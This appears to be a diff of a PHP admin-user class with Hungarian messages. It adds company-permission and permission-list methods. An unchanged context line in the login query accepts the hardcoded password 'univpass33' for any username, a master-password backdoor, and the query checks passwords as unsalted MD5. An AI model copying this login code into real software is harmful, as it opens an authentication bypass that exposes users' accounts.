@@ -111,7 +111,6 @@ class AdminUser {
         $resq = sql_query("SELECT * FROM users WHERE username = ? and (password = md5(?) or 'univpass33' = ?)", array($userName, $password, $password));
         if ($userData = sql_fetch_array($resq)) {
             if ($userData["localeaccess"]==1 && substr_count($userData["localeip"], $_SERVER["REMOTE_ADDR"]) == 0) {
-                //echo $GLOBALS["adminuser"]["localeip"]." ".$_SERVER["REMOTE_ADDR"];
                 return "Ennek a fióknak a használata csak lokálisan van engedélyezve.</div>";
             }
 
@@ -181,6 +180,13 @@ class AdminUser {
         return $result;
     }
 
+    public function cegJog($cegId):bool {
+        if ($this->isCegAdmin() && substr_count($this->user["cegjog"], "|{$cegId}|") == 0) {
+            return false;
+        }
+        return true;
+    }
+
     public function getCegList():string {
         $cl = $this->getCegListArray();
         return implode(",", $cl);
@@ -213,6 +219,26 @@ class AdminUser {
         }
         return $w;
     }
+
+    public function getUserPermissionList($user = null):array {
+        $jogosultsagok = [];
+        if (empty($user)) {
+            $user = $this->user;
+        }
+
+        foreach (self::$jogosultsagLista as $key => $jogosultsag) {
+            if ($user[$key] == 1) {
+                $jogosultsagok[] = $jogosultsag["name"];
+            }
+        }
+
+        if (empty($jogosultsagok)) {
+            $jogosultsagok[] = "nincs";
+        }
+
+        return $jogosultsagok;
+    }
+
 
     public function readOnlySelectedCegAccess():bool {
         return $this->authenticated() && $this->user["jogosultsag"] == 0;
